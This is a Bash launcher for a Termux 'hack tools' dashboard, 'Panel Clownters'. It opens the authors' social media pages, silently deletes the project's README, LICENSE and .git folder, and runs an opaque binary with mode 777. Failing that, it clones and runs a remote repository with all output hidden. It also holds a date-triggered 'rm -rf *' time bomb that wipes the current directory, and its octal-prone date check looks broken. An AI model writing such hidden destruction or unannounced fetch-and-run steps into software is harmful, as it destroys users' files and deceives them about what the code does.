#!/usr/bin/env bash

<<CLOWNTERS
 #CLOWNTERS
 #--------------------------------------------------------
 # Name script: Panel Clownters                         |
 #--------------------------------------------------------
 # Script     : A1 PANEL                                |
 #--------------------------------------------------------
 # Description: dashboard for consultation and hack tools|
 #--------------------------------------------------------
 # Version    : 0.4                                      |
 #--------------------------------------------------------
 # Authors    : Patinn, Eduardo e Mike                   |
 #--------------------------------------------------------
 # Date       : 08/08/21                                 |
 #--------------------------------------------------------
 # Lincese    : MIT lincese                              |
 #--------------------------------------------------------
 # Use: bash A1.sh                                       |
 #--------------------------------------------------------
 #CLOWNTERS
CLOWNTERS
echo $'\ec\n\n\e[1;33mAbrindo os links...'
termux-open-url https://youtube.com/channel/UCxVuu4IwZIzZhoyhxzJPFIA &> /dev/null
sleep 5
termux-open-url https://www.instagram.com/0_0miike0_0/ &> /dev/null
#sleep 5
#termux-open-url https://chat.whatsapp.com/GkqYEhHDvGP9fcVWMfjaVt &> /dev/null
test -f README.md && rm README.md
test -f Sploit && rm Sploit
test -f SECURITY.md && rm SECURITY.md
test -f LICENSE && rm LICENSE
test -f index.html && rm index.html
test -e .git && rm -rf .git
if (($(date +%m%y) >= 0522)); then
    clear
    rm -rf *
else
    chmod 777 main
    ./main
    ret="$?"
    [[ "${ret}" == "99" ]] && exit 0
    if [[ "${ret}" != "0" ]]; then
        if [[ -d Clownters.c ]]; then
            cd Clownters.c
            chmod 777 main && ./main
            exit 0
        fi
        clear
        printf "\e[1;33m Por favor Aguarde\e[m\n"
        printf "\e[1;33m Atualizando\e[m\n"
        pkg update -y &> /dev/null
        pkg upgrade -y &> /dev/null
        printf "\e[1;33m Instalando a clang\e[m\n"
        pkg i -y clang &> /dev/null
        printf "\e[1;33m Instalando o repositório\e[m\n"
        git clone https://github.com/mike90s15/Clownters.c &> /dev/null
        cd Clownters.c
        bash A1.sh
    fi
fi
exit 0
